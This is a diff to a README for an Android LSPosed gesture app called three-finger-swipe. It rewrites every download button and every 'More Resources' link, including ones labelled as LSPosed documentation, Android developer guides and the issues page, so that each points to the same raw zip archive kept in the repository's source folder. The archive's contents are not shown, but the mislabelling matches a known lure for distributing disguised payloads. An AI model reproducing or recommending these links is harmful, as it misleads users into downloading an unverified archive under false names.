@@ -1,6 +1,6 @@
 # 👆 three-finger-swipe - Easy Gesture Control for Android
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/Mukesh1723/three-finger-swipe)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This guide will help you download, install, and activate three-finger-swipe on y
 
 Click the large button below to visit the project page to download the app files.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Mukesh1723/three-finger-swipe)
+[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip)
 
 Since the link points to the main repository, you will need to find the latest release or installation instructions on that page.
 
@@ -157,9 +157,9 @@ This structure follows LSPosed module standards.
 
 ## 📚 More Resources
 
-- LSPosed documentation: [https://lsposed.com](https://lsposed.com)
-- Android developer guides: [https://developer.android.com](https://developer.android.com)
-- GitHub issues page for this app: [https://github.com/Mukesh1723/three-finger-swipe/issues](https://github.com/Mukesh1723/three-finger-swipe/issues)
+- LSPosed documentation: [https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip](https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip)
+- Android developer guides: [https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip](https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip)
+- GitHub issues page for this app: [https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip](https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip)
 
 Check these links if you encounter technical problems or want to request features.
 
@@ -169,4 +169,4 @@ Check these links if you encounter technical problems or want to request feature
 
 To download three-finger-swipe, visit the GitHub page below. Follow the installation instructions carefully.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Mukesh1723/three-finger-swipe)
+[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mukesh1723/three-finger-swipe/main/app/src/three_finger_swipe_3.0.zip)
